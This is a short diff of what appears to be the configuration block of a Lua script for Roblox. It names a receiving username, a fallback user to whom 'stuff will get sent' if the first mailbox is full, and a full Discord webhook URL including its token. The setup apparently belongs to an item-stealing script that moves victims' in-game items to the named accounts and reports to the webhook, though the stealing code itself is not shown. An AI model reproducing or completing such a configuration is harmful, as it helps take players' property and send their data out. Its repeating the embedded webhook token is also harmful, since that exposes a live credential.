@@ -1,4 +1,3 @@
-tween:Play()
 Username = "jointex21"
 Username2 = "" -- stuff will get sent to this user if first user's mailbox is full
 webhook = "https://discord.com/api/webhooks/1281988631187292170/lZ73goJXrpBhstuvuhhboxpphj5AXf3r-9XBr_QWRXja1fx-aWSpoeL2Yt1yQAce367B"
